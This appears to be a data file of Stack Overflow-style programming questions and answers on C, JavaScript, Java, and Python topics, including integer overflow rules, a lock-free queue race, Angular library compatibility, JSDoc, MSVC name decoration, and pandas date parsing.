why is unsigned integer overflow defined behavior but signed integer overflow isn39t,"Unsigned integer overflow is well defined by both the C and C++ standards.  For example, the C99 standard (§6.2.5/9) states 

A computation involving unsigned operands can never overﬂow,
  because a result that cannot be represented by the resulting unsigned integer type is
  reduced modulo the number that is one greater than the largest value that can be
  represented by the resulting type.

However, both standards state that signed integer overflow is undefined behavior.  Again, from the C99 standard (§3.4.3/1)

An example of undeﬁned behavior is the behavior on integer overﬂow

Is there an historical or (even better!) a technical reason for this discrepancy?
","The historical reason is that most C implementations (compilers) just used whatever overflow behaviour was easiest to implement with the integer representation it used. C implementations usually used the same representation used by the CPU - so the overflow behavior followed from the integer representation used by the CPU.
In practice, it is only the representations for signed values that may differ according to the implementation: one's complement, two's complement, sign-magnitude. For an unsigned type there is no reason for the standard to allow variation because there is only one obvious binary representation (the standard only allows binary representation).
Relevant quotes:
C99 6.2.6.1:3:

Values stored in unsigned bit-fields and objects of type unsigned char shall be represented using a pure binary notation.

C99 6.2.6.2:2:

If the sign bit is one, the value shall be modified in one of the following ways:
— the corresponding value with sign bit 0 is negated (sign and magnitude);
— the sign bit has the value −(2N) (two’s complement);
— the sign bit has the value −(2N − 1) (one’s complement).


Nowadays, all processors use two's complement representation, but signed arithmetic overflow remains undefined and compiler makers want it to remain undefined because they use this undefinedness to help with optimization. See for instance this blog post by Ian Lance Taylor or this complaint by Agner Fog, and the answers to his bug report.
",c
a bugs that i cannot solve in lockfree queue,"UPDATE:
I realized using the producer_done flag to determine the exit point from the consumer would cause trouble, so I rewrote the test code as below.
However, the mismatch still occurred, and I could not understand the output messages, especially

Why T48 is able to dequeue the second item without the first item being dequeued first?
Why T52 steps back total_items_consumed from 1 to 2? It's so confusing.

Output messages:
Jan  8 17:12:57 DESKTOP-VC5TFK0 LFQueue[378834]: Integrated concurrency test with 2 producer(s)/2 consumer(s), 2 items to enqueue/dequeue
Jan  8 17:12:57 DESKTOP-VC5TFK0 LFQueue[378834]: thread(140251564394048) total_items_consumed move forward to 1
Jan  8 17:12:57 DESKTOP-VC5TFK0 LFQueue[378834]: thread(140251564394048) total_items_consumed back to 0 due to empty
Jan  8 17:12:57 DESKTOP-VC5TFK0 LFQueue[378834]: thread(140251564394048) total_items_consumed move forward to 2
Jan  8 17:12:57 DESKTOP-VC5TFK0 LFQueue[378834]: thread(140251564394048) dequeue succeed! now total_items_consumed: 2
Jan  8 17:12:57 DESKTOP-VC5TFK0 LFQueue[378834]: thread(140251572786752) total_items_consumed move forward to 1
Jan  8 17:12:57 DESKTOP-VC5TFK0 LFQueue[378834]: thread(140251572786752) total_items_consumed step back to 2 due to empty queue
Jan  8 17:12:57 DESKTOP-VC5TFK0 LFQueue[378834]: thread(140251572786752) total_items_consumed move forward to 3
Jan  8 17:12:57 DESKTOP-VC5TFK0 LFQueue[378834]: thread(140251572786752) total_items_consumed step back to 2, then break;
Jan  8 17:12:57 DESKTOP-VC5TFK0 LFQueue[378834]: thread(140251564394048) total_items_consumed move forward to 3
Jan  8 17:12:57 DESKTOP-VC5TFK0 LFQueue[378834]: thread(140251564394048) total_items_consumed step back to 1, then break;
Jan  8 17:12:57 DESKTOP-VC5TFK0 LFQueue[378834]: FAILED
Jan  8 17:12:57 DESKTOP-VC5TFK0 LFQueue[378834]: Mismatch: Expected Consumed (2), Actual Consumed (1)

updated test code:
typedef struct
{
    pthread_mutex_t lock;
    pthread_cond_t start_cond;
    int start_flag;
    atomic_ulong total_items_produced;
    atomic_ulong total_items_consumed;
} sync_primitives_t;

typedef struct
{
    sync_primitives_t sync;
    lf_queue_t queue;
    unsigned long total_items;
} thread_args_t;

void *producer_thread(void *arg)
{
    thread_args_t *args = (thread_args_t *)arg;

    pthread_mutex_lock(&(args->sync.lock));
    while (!(args->sync.start_flag))
    {
        pthread_cond_wait(&(args->sync.start_cond), &(args->sync.lock));
    }
    pthread_mutex_unlock(&(args->sync.lock));

    int value = 1;
    while (1)
    {
        unsigned long old_count = atomic_fetch_add(&(args->sync.total_items_produced), 1);
        if (old_count >= args->total_items)
        {
            atomic_fetch_sub(&(args->sync.total_items_produced), 1);
            break;
        }

        enqueueLF(&(args->queue), value);
    }

    return NULL;
}

void *consumer_thread(void *arg)
{
    thread_args_t *args = (thread_args_t *)arg;

    pthread_mutex_lock(&(args->sync.lock));
    while (!(args->sync.start_flag))
    {
        pthread_cond_wait(&(args->sync.start_cond), &(args->sync.lock));
    }
    pthread_mutex_unlock(&(args->sync.lock));

    int value = 0;

    while (1)
    {
        unsigned long old_count = atomic_fetch_add(&(args->sync.total_items_consumed), 1);
        syslog(LOG_DEBUG, ""thread(%lu) total_items_consumed move forward to %lu"",
               (pthread_self()), atomic_load(&(args->sync.total_items_consumed)));

        if (old_count >= args->total_items)
        {
            atomic_fetch_sub(&(args->sync.total_items_consumed), 1);
            syslog(LOG_DEBUG, ""thread(%lu) total_items_consumed step back to %lu, then break;"",
                   (pthread_self()), atomic_load(&(args->sync.total_items_consumed)));
            break;
        }

        int ret = dequeueLF(&(args->queue), &value);
        if (ret != 0)
        {
            atomic_fetch_sub(&(args->sync.total_items_consumed), 1);
            syslog(LOG_DEBUG, ""thread(%lu) total_items_consumed step back to %lu due to empty queue"",
                   (pthread_self()), atomic_load(&(args->sync.total_items_consumed)));
        }
        else
        {
            syslog(LOG_DEBUG, ""thread(%lu) dequeue succeed! now total_items_consumed: %lu"",
                   (pthread_self()), atomic_load(&(args->sync.total_items_consumed)));
        }
    }

    return NULL;
}

int integrated_test(unsigned num_producers, unsigned num_consumers, unsigned long total_items)
{
    syslog(LOG_INFO, ""Integrated concurrency test with %d producer(s)/%d consumer(s), %lu items to enqueue/dequeue"",
           num_producers, num_consumers, total_items);

    thread_args_t args = {
        .sync = {.lock = PTHREAD_MUTEX_INITIALIZER,
                 .start_cond = PTHREAD_COND_INITIALIZER,
                 .start_flag = 0,
                 .total_items_produced = ATOMIC_VAR_INIT(0),
                 .total_items_consumed = ATOMIC_VAR_INIT(0)},
        .queue = {0},
        .total_items = total_items,
    };

    LFQueue_init(&args.queue);

    pthread_t producer_threads[num_producers];
    for (unsigned i = 0; i < num_producers; i++)
    {
        if (pthread_create(&producer_threads[i], NULL, producer_thread, &args) !=
            0)
        {
            fprintf(stderr, ""Failed to create producer thread %d.\n"", i);
            exit(EXIT_FAILURE);
        }
    }

    pthread_t consumer_threads[num_consumers];
    for (unsigned i = 0; i < num_consumers; i++)
    {
        if (pthread_create(&consumer_threads[i], NULL, consumer_thread, &args) !=
            0)
        {
            fprintf(stderr, ""Failed to create consumer thread %d.\n"", i);
            exit(EXIT_FAILURE);
        }
    }

    pthread_mutex_lock(&args.sync.lock);
    args.sync.start_flag = 1;
    pthread_cond_broadcast(&args.sync.start_cond);
    pthread_mutex_unlock(&args.sync.lock);

    for (unsigned i = 0; i < num_producers; i++)
    {
        pthread_join(producer_threads[i], NULL);
    }

    for (unsigned i = 0; i < num_consumers; i++)
    {
        pthread_join(consumer_threads[i], NULL);
    }

    LFQueue_destory(&args.queue);

    /* Determine test result */
    unsigned long expected_produced = total_items;
    unsigned long expected_consumed = total_items;
    unsigned long actual_produced = atomic_load(&(args.sync.total_items_produced));
    unsigned long actual_consumed = atomic_load(&(args.sync.total_items_consumed));

    if (expected_produced != actual_produced)
    {
        syslog(LOG_ERR, ""FAILED\n"");
        syslog(LOG_ERR, ""Mismatch: Expected Produced (%lu), Actual Produced (%lu)"",
               expected_produced, actual_produced);
        exit(EXIT_FAILURE);
        return -1;
    }

    if (actual_consumed != expected_consumed)
    {
        syslog(LOG_ERR, ""FAILED\n"");
        syslog(LOG_ERR, ""Mismatch: Expected Consumed (%lu), Actual Consumed (%lu)"",
               expected_consumed, actual_consumed);
        exit(EXIT_FAILURE);
        return -1;
    }

    printf(""SUCCESS\n"");

    return 0;
}

int main(void)
{
    openlog(""LFQueue"", LOG_PID, LOG_USER);

    unsigned long total_items = 2;
    unsigned num_producers = 2;
    unsigned num_consumers = 2;
    integrated_test(num_producers, num_consumers, total_items);

    closelog();

    return EXIT_SUCCESS;
}


I've implemented a lock-free queue in C, mimicking the pseudo-code of enqueue and dequeue from Maged M. Michael's paper, and a test code for it. Most of the time it works, but sometimes it's failed due to a mismatch:  message like

Mismatch: Expected Consumed (100), Actual Consumed (65)

, meaning there are still 35 nodes in the queue.
Although it's causing a memory leak, I deliberately choose not to free dequeued nodes and solely focus on the mismatch in the number of nodes enqueued/dequeued. Because no node is freed, there is no ABA problem.
You should able to run the code by simple copy/paste(s).
I use this shell command to run the program simultaneously:
for i in {1..10}; do ./main; done

source code:
#include <pthread.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>


typedef struct node node_t;
struct node {
  int data;
  _Atomic(node_t *) next;
};

typedef struct lockFreeQueue lf_queue_t;
struct lockFreeQueue {
  _Atomic(node_t *) head;
  _Atomic(node_t *) tail;
};

int LFQueue_init(lf_queue_t *me) {
  node_t *dummy = malloc(sizeof(struct node));
  atomic_init(&(dummy->next), NULL);
  atomic_init(&(me->head), dummy);
  atomic_init(&(me->tail), dummy);

  return 0;
}

int LFQueue_destory(lf_queue_t *me) {

  node_t *curr = atomic_load_explicit(&me->head, memory_order_seq_cst);
  node_t *next = NULL;
  while (curr) {
    next = atomic_load_explicit(&curr->next, memory_order_seq_cst);
    free(curr);
    curr = next;
  }

  return 0;
}

void enqueueLF(lf_queue_t *me, int data) {

  node_t *newNode = malloc(sizeof(struct node));
  newNode->data = data;
  atomic_store_explicit(&newNode->next, NULL, memory_order_seq_cst);

  node_t *t = NULL;
  node_t *next = NULL;
  while (1) {
    t = atomic_load_explicit(&me->tail, memory_order_seq_cst);
    next = atomic_load_explicit(&t->next, memory_order_seq_cst);

    if (atomic_load_explicit(&me->tail, memory_order_seq_cst) != t) {
      continue;
    }

    if (next != NULL) {
      atomic_compare_exchange_strong_explicit(
          &me->tail, &t, next, memory_order_seq_cst, memory_order_seq_cst);
      continue;
    }

    node_t *expected = NULL;
    if (atomic_compare_exchange_strong_explicit(&t->next, &expected, newNode,
                                                memory_order_seq_cst,
                                                memory_order_seq_cst)) {
      break;
    }
  }

  atomic_compare_exchange_strong_explicit(
      &me->tail, &t, newNode, memory_order_seq_cst, memory_order_seq_cst);
}

int dequeueLF(lf_queue_t *me, int *output) {

  node_t *h = NULL;
  node_t *t = NULL;
  node_t *next = NULL;
  while (1) {
    h = atomic_load_explicit(&me->head, memory_order_seq_cst);
    t = atomic_load_explicit(&me->tail, memory_order_seq_cst);
    next = atomic_load_explicit(&h->next, memory_order_seq_cst);

    if (atomic_load_explicit(&me->head, memory_order_seq_cst) != h) {
      continue;
    }

    if (next == NULL) { /*is empty*/
      return -1;
    }

    if (h == t) { // help enqueue to advance tail pointer
      atomic_compare_exchange_strong_explicit(
          &me->tail, &t, next, memory_order_seq_cst, memory_order_seq_cst);
      continue;
    }

    *output = next->data;
    if (atomic_compare_exchange_strong_explicit(
            &me->head, &h, next, memory_order_seq_cst, memory_order_seq_cst)) {
      break;
    }
  }

  return 0;
}

typedef struct {
  pthread_mutex_t lock;
  pthread_cond_t start_cond;
  int start_flag;
  atomic_bool producer_done;
} sync_primitives_t;

typedef struct {
  sync_primitives_t sync;
  lf_queue_t queue;
  unsigned long num_items;
} thread_args_t;

void *producer_thread(void *arg) {
  thread_args_t *args = (thread_args_t *)arg;

  pthread_mutex_lock(&(args->sync.lock));
  while (!(args->sync.start_flag)) {
    pthread_cond_wait(&(args->sync.start_cond), &(args->sync.lock));
  }
  pthread_mutex_unlock(&(args->sync.lock));

  unsigned long per_thread_produced = 0;
  int value = 0;
  for (unsigned long i = 0; i < args->num_items; i++) {
    value++;
    while (1) {
      enqueueLF(&args->queue, value);
      per_thread_produced++;
      break;
    }
  }

  unsigned long *ret = malloc(sizeof(unsigned long));
  *ret = per_thread_produced;
  return (void *)ret;
}

void *consumer_thread(void *arg) {
  thread_args_t *args = (thread_args_t *)arg;

  pthread_mutex_lock(&(args->sync.lock));
  while (!(args->sync.start_flag)) {
    pthread_cond_wait(&(args->sync.start_cond), &(args->sync.lock));
  }
  pthread_mutex_unlock(&(args->sync.lock));

  unsigned long per_thread_consumed = 0;
  int value = 0;
  while (1) {
    int ret = dequeueLF(&args->queue, &value);
    if (ret == -1) {
      /*empty queue*/
      if (atomic_load(&(args->sync.producer_done)) == 1) {
        break;
      }
    } else if (ret == 0) {
      per_thread_consumed++;
    } else {
    }
  }

  unsigned long *ret = malloc(sizeof(unsigned long));
  *ret = per_thread_consumed;
  return (void *)ret;
}

int integrated_test(unsigned num_producers, unsigned long items_per_producer,
                    unsigned num_consumers) {
  printf(""Integrated concurrency test with %d producer(s)/%d consumer(s), %ld ""
         ""per producer, %lu items to dequeue: "",
         num_producers, num_consumers, items_per_producer,
         (items_per_producer * num_producers));

  thread_args_t args = {
      .sync = {.lock = PTHREAD_MUTEX_INITIALIZER,
               .start_cond = PTHREAD_COND_INITIALIZER,
               .start_flag = 0,
               .producer_done = ATOMIC_VAR_INIT(0)},
      .queue = {0},
      .num_items = items_per_producer,
  };

  LFQueue_init(&args.queue);

  pthread_t producer_threads[num_producers];
  for (unsigned i = 0; i < num_producers; i++) {
    if (pthread_create(&producer_threads[i], NULL, producer_thread, &args) !=
        0) {
      fprintf(stderr, ""Failed to create producer thread %d.\n"", i);
      for (unsigned j = 0; j < i; j++) {
        pthread_join(producer_threads[j], NULL);
      }
      return -1;
    }
  }

  pthread_t consumer_threads[num_consumers];
  for (unsigned i = 0; i < num_consumers; i++) {
    if (pthread_create(&consumer_threads[i], NULL, consumer_thread, &args) !=
        0) {
      fprintf(stderr, ""Failed to create consumer thread %d.\n"", i);
      for (unsigned j = 0; j < i; j++) {
        pthread_join(consumer_threads[j], NULL);
      }
      return -1;
    }
  }

  pthread_mutex_lock(&args.sync.lock);
  args.sync.start_flag = 1;
  pthread_cond_broadcast(&args.sync.start_cond);
  pthread_mutex_unlock(&args.sync.lock);

  unsigned long actual_produced = 0;
  void *ret = NULL;
  for (unsigned i = 0; i < num_producers; i++) {
    pthread_join(producer_threads[i], &ret);
    if (ret) {
      actual_produced = actual_produced + *((unsigned long *)ret);
      free(ret);
    }
  }

  atomic_store(&(args.sync.producer_done), 1);

  unsigned long actual_consumed = 0;
  ret = NULL;
  for (unsigned i = 0; i < num_consumers; i++) {
    pthread_join(consumer_threads[i], &ret);
    if (ret) {
      actual_consumed = actual_consumed + *((unsigned long *)ret);
      free(ret);
    }
  }

  LFQueue_destory(&args.queue);

  /* Validate the total number of consumed items */
  unsigned long expected_produced =
      (unsigned long)num_producers * items_per_producer;
  unsigned long expected_consumed = expected_produced;

  /* Determine test result */

  if (actual_produced != expected_produced) {
    printf(""FAILED\n"");
    printf(""Mismatch: Expected Produced (%lu), Actual Produced (%lu)\n"",
           expected_produced, actual_produced);
    exit(EXIT_FAILURE);
    return -1;
  }

  if (actual_consumed != expected_consumed) {
    printf(""FAILED\n"");
    printf(""Mismatch: Expected Consumed (%lu), Actual Consumed (%lu)\n"",
           expected_consumed, actual_consumed);
    exit(EXIT_FAILURE);
    return -1;
  }

  printf(""SUCCESS\n"");

  return 0;
}

int main(void) {
  int num_producers = 1;
  int num_consumers = 1;
  unsigned long items_per_producer = 100;
  integrated_test(num_producers, items_per_producer, num_consumers);
  return EXIT_SUCCESS;
}

","
However, the mismatch still occurred, and I could not understand the
output messages, especially

Why T48 is able to dequeue the second item without the first item being dequeued first?


It doesn't.


Why T52 steps back total_items_consumed from 1 to 2?


It doesn't.
It looks like the order of the log messages probably is not consistent with the order of atomic operations upon which they are reporting.  That would not be particularly surprising.  You cannot judge directly from the order of the log how the actions of one thread are ordered with respect to the actions of the other.
Let's separate them, then:
thread(140251564394048) / T48

total_items_consumed move forward to 1
total_items_consumed back to 0 due to empty
total_items_consumed move forward to 2
dequeue succeed! now total_items_consumed: 2
total_items_consumed move forward to 3
total_items_consumed step back to 1, then break;

thread(140251572786752) / T52

total_items_consumed move forward to 1
total_items_consumed step back to 2 due to empty queue
total_items_consumed move forward to 3
total_items_consumed step back to 2, then break;

There is a total order over all of the program's atomic operations. Here are the relevant highlights of one such order that is consistent with the per-thread log ordering and the logged results of the atomic operations:

T48's atomic_fetch_add() lands, advancing the consumed counter from 0 to 1 (T48.1)
T48 then fails to dequeue an item (several atomic operations involved), and its atomic_fetch_sub() lands (T48.2)
T52's first atomic_fetch_add() lands, advancing the consumed counter from 0 to 1 (T52.1)
T48's second atomic_fetch_add() lands, advancing the consumed counter from 1 to 2 (T48.3)
T48's dequeue succeeds (several atomic operations; T48.4).  It leaves the consumed counter at 2.
T48's third atomic_fetch_add() lands, advancing the consumed counter from 2 to 3 (T48.5).  It concludes that all expected items have been produced.
T52 fails to dequeue an item due to an empty queue (several atomic operations) and decrements the consumed counter from 3 to 2 (T52.2)
T52's next atomic_fetch_add() lands, advancing the consumed counter from 2 back to 3 (T52.3)
T52 thinks all expected items have been produced, so it decrements the consumed counter from 3 to 2, and terminates (T52.4)
T48, acting on its previous determination that all items have been produced, decrements the consumed counter from 2 to 1, and terminates (T48.6)


So what's wrong?
Your consumer threads increment the consumed item count speculatively, before they actually consume an item. That's ok for them internally, in that they soon discover whether they need to decrement it again, but it causes problems for other consumer threads, which do not know that the consumed count they observe includes a not-yet-performed dequeue.  Note that the final consumption count presented in the question reports correctly that only one item was dequeued.  This reflects each thread doing the correct thing individually, based on what it concludes from the data available to it.
Often in programming, the best approach is to just attempt an action and deal appropriately with the result, whether success or failure, rather than trying to predict success or failure in advance.  Here, the consumer should just attempt the dequeue.  If that succeeds, then the consumer increments the consumed count.  Only if the dequeue fails does the thread check the consumed count to see whether all expected items have already been consumed.
That may leave consumers spinning for a little while as they wait for the thread that consumes the last item to update the consumed count, but it avoids any thread observing a consumed count in excess of the number of items actually consumed.  And the consumers already spin while waiting for items to be produced, so a little extra spinning does not make a qualitative difference.
Suggested consumer loop:
    while (1) {
        int ret = dequeueLF(&(args->queue), &value);

        if (ret == 0) {
            unsigned long old_count = atomic_fetch_add(&(args->sync.total_items_consumed), 1);

            syslog(LOG_DEBUG, ""thread(%lu) dequeue succeed! new total_items_consumed: %lu"",
                   (unsigned long) pthread_self(), old_count + 1);
        } else {
            unsigned long consumed_count = atomic_load(&(args->sync.total_items_consumed));

            syslog(LOG_DEBUG, ""thread(%lu) dequeue failed with total_items_consumed: %lu"",
                   (unsigned long) pthread_self(), consumed_count);
            if (consumed_count >= args->total_items) {
                syslog(LOG_DEBUG, ""thread(%lu) observed all expected items consumed; terminating"",
                       (unsigned long) pthread_self());
                break;
            }
        }
    }

",c
is there a way i can get this package to work with angular 16,"I have used the package https://www.npmjs.com/package/ngx-hotjar v11.0.0 successfully on an Angular 10 project. I have created a new Angular 16 project and I get the error below when running ng serve:
Error: src/app/app.module.ts:275:12 - error NG6002: 'NgxHotjarModule' does not appear to be an NgModule class.
275   imports: [
               ~
276     BrowserModule,
    ~~~~~~~~~~~~~~~~~~
...
341     // SweetAlert2Module.forRoot()
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
342   ],
    ~~~
node_modules/ngx-hotjar/lib/ngx-hotjar.module.d.ts:22:22
    22 export declare class NgxHotjarModule {
                            ~~~~~~~~~~~~~~~
    This likely means that the library (ngx-hotjar) which declares NgxHotjarModule is not compatible with Angular Ivy. Check if a newer version of the library is available, and update if so. Also consider checking with the library's authors to see if the library is expected to be compatible with Ivy.
Error: src/app/app.module.ts:337:5 - error NG6002: 'NgxHotjarRouterModule' does not appear to be an NgModule class.

337     NgxHotjarRouterModule,
        ~~~~~~~~~~~~~~~~~~~~~

  node_modules/ngx-hotjar/lib/ngx-hotjar-router/ngx-hotjar-router.module.d.ts:29:22
    29 export declare class NgxHotjarRouterModule {
                            ~~~~~~~~~~~~~~~~~~~~~
    This likely means that the library (ngx-hotjar) which declares NgxHotjarRouterModule is not compatible with Angular Ivy. Check if a newer version of the library is available, and update if so. Also consider checking with the library's authors to see if the library is expected to be compatible with Ivy.

To Reproduce
Create a new Angular 16 project
npm i ngx-hotjar

**app.module.ts:**
import { NgxHotjarModule, NgxHotjarRouterModule } from 'ngx-hotjar';
imports: [ ...   NgxHotjarModule.forRoot(environment.hj.trackingCode),
    NgxHotjarRouterModule]


","Angular v16 dropped the support of non-ivy libraries by removing the so called ""Angular Compatibility Compiler"" or NGCC.
Starting v16, libraries that weren't built for ivy are not supported anymore and there is runtime no workaround.
You'll either have to fork the library to publish an Ivy version of it or find a replacement for your dependency.
",javascript
spring boot can a springboot app be deployed to upcloud or vultr cloud services,"I am trying to host my spring boot app, based on the documentation of spring boot they mention Heroku, AWS, Google Cloud, google cloud as some of the host providers. I want to know if Springboot apps can be hosted also on Vultr and Upcloud and any other. 
","Spring boot is a simple java application can be deployed in any cloud. please specify if you have some specific concern.
Please look into this link:
https://docs.spring.io/spring-boot/docs/current/reference/html/deployment-install.html
",java
android studio does not have java language,"Friends, when I want to create an empty project in Android Studio, why is the language not Java?
this is my image
i want to add java lang in android studio empty project
but i cant
I will do this to reach 200 characters...
","The build configuration language is not related to the program code language.
The build configuration is handled by gradle and gradle scripts used to be written in Groovy. This is now beeing phased out in favor of a Kotlin based DSL.
So selecting the Kotlin DSL for the build configuration will still allow you to use Java for your actual app.
You can find more information about Gradle and how build scripts are used with Android here: Gradle build overview - Configuration DSLs
",java
how should i comment object structure in javascript,"I am using the following syntax to comment my code,
/*
 * @param variableName {variableType} Description
 * @return {returnType} Description
 */

But I now don't know how to comment my code for a constructor of one of my objects as the parameter is an object and that object's dictionary key is a parameter in itself as well as the value of that key.
My structure for the parameter is like below;
assets: {

    fruits: {

        rootPath: ""files/fruits/"",

        images: {

            apple: ""apple.png"",
            kiwi: ""kiwi.png"",
            orange: ""orange.png"",
            peach: ""peach.png"",
            pear: ""pear.png"",
            strawberry: ""strawberry.png"",
            watermelon: ""watermelon.png""
        }
    },
    humans: {

        audio: {

            atari: ""http://www.universal-soundbank.com/mp3/sounds/18534.mp3""
        }
    }
}

I have started by commenting that assets is an object:
@param assets {Object}

But how do I then go on to comment that the properties of assets is a value in itself? I understand this question may be a little off-topic, but I just want to make sure that my code comments conform to some kind of syntax rule and I haven't been able to find anything on this matter.
","Most informative is to enumerate all object properties as separate parameters. [Bracket] optional properties, e.g:
/**
 *
 * @param {Object} assets Description
 * @param {Object} assets.fruits Description
 * @param {Object} assets.fruits.rootPath Description
 * @param {Object} assets.fruits.images Description
 * @param {Object} [assets.humans] Description
 *
 */

See ""Parameters with Properties"" from JSDoc. Also How to describe ""object"" arguments in jsdoc?. 
",javascript
calling convention name mangling in c,"What I ask is NOT how to disable C++ name mangling (i know its extern ""c""). The question is not about C++
As far as i know, when i declare a function as __stdcall its name should be mangled like in _FuncName@8 (for two int parameters). When I declare a function as __cdecl it should be mangled like in _FuncName. 
Sounds fine but is it really like this? 
There are two cases that I don't understand:
1-) I'm making a dll in vc++2013 and I use __declspec(dllexport) on a __cdecl function. its exported without any underscore (just FuncName). I don't have a .def file or anything and not using pragma export.
2-) Most of Windows API functions are __stdcall. But they don't have _ or @. For example they are exported like MessageBoxA without any mangling.
So how can this be explained?
","Yes, Visual C++ adds name decoration to C symbol exports, as well as name mangling of C++ exports. You can read up on the name decoration conventions on MSDN in the topics for each calling convention keyword. The extern ""C"" linkage specification actually switches the exported symbols from C++ name mangling to C name decoration, which surprises people from time to time.
So in the case of a C file that exports a function, if you read the documentation on MSDN for __cdecl very, very closely, you'll see that it mentions that the ""Underscore character (_) is prefixed to names, except when __cdecl functions that use C linkage are exported."" This still isn't as clear as it could be, since ""exported"" here refers to DLL export, and it also applies to non-function symbols such as exported data. This is what you're seeing in your own code.
My speculation is that these names are undecorated for DLL export in order to make language interop easy. You'll note that the linkage symbol name exports still have the leading underscore, which you can see if you dump the exports of the .lib file.
As for the second case, the __stdcall Windows API functions are exported with specific names using .def files. That's how you get the default name mapped to the narrow- and wide-character versions of the APIs, too. You can get the same effect with #pragma comment(linker, ""/export:alias=_original""), but it's probably most portable to use the .def file approach.
You can find a story about The history of calling conventions on Raymond Chen's The Old New Thing blog.
",c
want to write regex in javascript which will check if all the mentioned chars exist at least ones,"I have string s and need to check if that string contains every single alphabet from a to z. What will the regex be to check this condition? where s can be very big string with multiple words separated with space.
ex:
pattern.test(""zy aemnofgbc jkhil pqasdfrs tuvrhfwx"") 

should return true as it contains all a-z alphabets at least ones.
pattern.test(""sdfasbcd effsdgh ijsfghtkl mnhtop qrsjht uvwmnmx yfdhjkd"") 

should return false as it doesn't have alphabet z.
Looking for optimum solution.
","First solution with regex - removes all non-alphabetic characters, duplicates, and compares the string length with 26.
Second solution without regex, just checks is every alphabetic characters in string.


const test1 = (str) => str.replace(/[^a-z]|(.)(?=.*\1)/gi, '').length === 26;

const test2 = (str) => [...`abcdefghijklmnopqrstuvwxyz`]
  .every(ch => str.includes(ch));


console.log(test1('zy aemnofgbc jkhil pqasdfrs tuvrhfwx'));
console.log(test1('y aemnofgbc jkhil pqasdfrs tuvrhfwx'));

console.log(test2('zy aemnofgbc jkhil pqasdfrs tuvrhfwx'));
console.log(test2('y aemnofgbc jkhil pqasdfrs tuvrhfwx'));
.as-console-wrapper{min-height: 100%!important; top: 0}



",javascript
make python3 as my default python on mac,"What I'm trying to do here is to make python3 as my default python. Except the python 2.7 which automatically installed on mac, I installed python3 with homebrew. This is the website that I'm following. http://docs.python-guide.org/en/latest/starting/install3/osx/#install3-osx
I guess I followed every instruction well, got xcode freshly installed, Command line tools, and homebrew. But here's my little confusion occurs.

The script will explain what changes it will make and prompt you before the installation begins. Once you’ve installed Homebrew, insert the Homebrew directory at the top of your PATH environment variable. You can do this by adding the following line at the bottom of your ~/.profile file
export PATH=/usr/local/bin:/usr/local/sbin:$PATH

I was really confused what this was, but I concluded that I should just add this following line at the bottom of ~/.profile file. So I opened the ~/.profile file by open .profile in the terminal, and added following line at the bottom. And now it looks like this.
export PATH=/usr/local/bin:/usr/local/sbin:$PATH
# Setting PATH for Python 3.6
# The original version is saved in .profile.pysave
export PATH=/usr/local/bin:/usr/local/sbin:$PATH

And then I did brew install python, and was hoping to see python3 when I do python --version.
But it just shows me python 2.7.10. I want my default python to be python3 not 2.7
And I found a little clue from the website.

Do I have a Python 3 installed?

$ python --version
Python 3.6.4


If you still see 2.7 ensure in PATH /usr/local/bin/ takes pecedence over /usr/bin/

Maybe it has to do something with PATH? Could someone explain in simple English what PATH exactly is and how I could make my default python to be python3 when I run python --version in the terminal?
","Probably the safest and easy way is to use brew and then just modify your PATH:
First update brew:
brew update

Next install python:
brew install python

That will install and symlink python3 to python, for more details do:
brew info python

Look for the Caveats:
==> Caveats
Python has been installed as
  /usr/local/bin/python3

Unversioned symlinks `python`, `python-config`, `pip` etc. pointing to
`python3`, `python3-config`, `pip3` etc., respectively, have been installed into
  /usr/local/opt/python/libexec/bin

Then add to your path /usr/local/opt/python/libexec/bin:
export PATH=/usr/local/opt/python/libexec/bin:$PATH

The order of the PATH is important, by putting first the /usr/local/opt/python/libexec/bin will help to give preference to the brew install (python3) than the one is in your system located in /usr/bin/python
",python
how is code working after optimising,"While studying Compiler optimizations,  I simply compiled following piece of code : 
#include<stdio.h>
struct fraction {
    int num ;
    int denum ;
};

int main()
{
  struct fraction pi;
  pi.num = 22;
  pi.denum = 7;
  return 0;
}

using 
gcc test.c -o test

When I disassemble this, I get : 
push   %ebp
mov    %esp,%ebp
sub    $0x10,%esp
movl   $0x16,-0x8(%ebp)
movl   $0x7,-0x4(%ebp)
mov    $0x0,%eax
leave  
ret 

But if I apply optimizations like :
gcc test.c -o test -O3

all I get in disassembly is :
push   %ebp
xor    %eax,%eax
mov    %esp,%ebp
pop    %ebp
ret 

Without Optimizations the values 22 and 7 where clearly visible in disassembly and I could clearly understand how the code worked but where are those values now after optimizations ? how is the code working now ? Please somebody explain .
","Since your code doesn't effectively do anything externally visible that would have unpredictable side effects, the creation of the struct is simply eliminated completely, and now all your code does is returning 0 from main().
(If you tell the compiler that it does indeed need to create the struct because it may be modified by someone/something else, it won't get rid of the code. Declare your variables as volatile and you'll see it in the assembler.)
",c
pdread_csv not working with parse_dates,"I'm using the Netflix Movies and TV Shows dataset to better understand pandas.
The column date_added is in the format: ""September 21, 2024"" which, as I understand, would be parsed as ""%B-%d-%Y"". Simply Reading with pd.read_csv() returns this column as an object type.
Using parse_dates=['date_added'] doesn't seem to work, and neither specifying the format. Here is my code:
df = pd.read_csv('netflix_titles.csv', parse_dates=['date_added'], date_format='%B-%d-%Y')
df.info()

resulting in:
<class 'pandas.core.frame.DataFrame'>
RangeIndex: 8807 entries, 0 to 8806
Data columns (total 12 columns):
 #   Column        Non-Null Count  Dtype 
---  ------        --------------  ----- 
 0   show_id       8807 non-null   object
 1   type          8807 non-null   object
 2   title         8807 non-null   object
 3   director      6173 non-null   object
 4   cast          7982 non-null   object
 5   country       7976 non-null   object
 6   date_added    8797 non-null   object
 7   release_year  8807 non-null   int64 
 8   rating        8803 non-null   object
 9   duration      8804 non-null   object
 10  listed_in     8807 non-null   object
 11  description   8807 non-null   object
dtypes: int64(1), object(11)
memory usage: 825.8+ KB

What am I doing wrong?
","I see several problems here.

incorrect date_format (as wrote @iBeMeltin and @ayki)
nan values
spaces in values

How to check:
df = pd.read_csv('netflix_titles.csv')
for rec in df.to_dict('records'):
    try:
        datetime.strptime(rec['date_added'], '%B %d, %Y')
    except (TypeError, ValueError):
        print(rec)

